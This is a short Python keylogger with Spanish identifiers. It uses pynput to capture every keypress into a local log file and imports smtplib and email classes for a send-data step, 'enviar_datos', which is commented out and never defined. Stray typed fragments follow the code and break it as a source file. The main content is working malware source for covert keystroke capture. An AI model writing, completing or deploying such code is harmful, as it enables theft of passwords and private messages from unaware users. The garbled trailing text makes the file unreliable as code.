from pynput import keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
 
 
log_file = open('log.txt','w+')
lista_tecla = []
 
 
 
def imprimir():
	teclas = ''.join([str(i) for i in lista_tecla])
	log_file.write(teclas)
	log_file.write('\n')
	log_file.close()
	time.sleep(3)
	#enviar_datos()
 
def presiona(key):
	key1 = convertir(key)
	#print(lista_tecla)
	if key1 == keyboard.Key.esc:
		print('Saliendo...')
		imprimir()
		return False
	elif key1 == keyboard.Key.space:
		lista_tecla.append(' ')
	elif key1 == keyboard.Key.enter:
		lista_tecla.append('\n')
	elif key1 == keyboard.Key.backspace:
		pass
	elif key1 == keyboard.Key.tab:
		pass
	elif key1 == keyboard.Key.shift:
		pass
	elif key1 == keyboard.Key.shift_r:
		pass
	else:
		lista_tecla.append(key1)
 
def convertir(key):
	if isinstance(key,keyboard.Key):
		return key
	else:
		return key.char
 
with keyboard.Listener(on_press=presiona) as listen:
	listen.join() #se pone a la escucha



 hola com establecemos
 axasces
 a````